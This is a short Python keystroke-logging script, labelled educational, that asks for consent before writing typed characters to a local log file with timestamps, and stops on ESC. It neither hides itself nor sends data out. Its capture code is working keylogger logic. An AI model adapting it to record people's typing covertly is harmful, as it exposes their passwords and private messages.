from pynput import keyboard
from datetime import datetime

LOG_FILE = "keystrokes_log.txt"
listener = None

def write_log(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)
def on_press(key):
    global listener

    # Stop logging when ESC is pressed
    if key == keyboard.Key.esc:
        write_log("\n\nSession Ended Safely: " +
                  datetime.now().strftime("%d-%m-%Y %H:%M:%S") + "\n")
        print("\nLogging stopped safely.")
        listener.stop()
        return False

    try:
        # Letters, numbers, symbols
        write_log(key.char)
    except AttributeError:
        # Space key
        if key == keyboard.Key.space:
            write_log(" ")
        # Enter key
        elif key == keyboard.Key.enter:
            write_log("\n")


def main():
    global listener

    print("===================================")
    print("Simple Keylogger (Educational Use)")
    print("Press ESC to stop logging")
    print("===================================")

    consent = input("Do you agree to start keystroke logging? (yes/no): ").lower()

    if consent != "yes":
        print("Permission not granted. Exiting program.")
        return

    write_log("\n\n-----------------------------\n")
    write_log("Session Start: " +
              datetime.now().strftime("%d-%m-%Y %H:%M:%S") + "\n")
    write_log("Keys Pressed:\n")

    print("Logging started. Press ESC to stop.")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

if __name__ == "__main__":
    main()
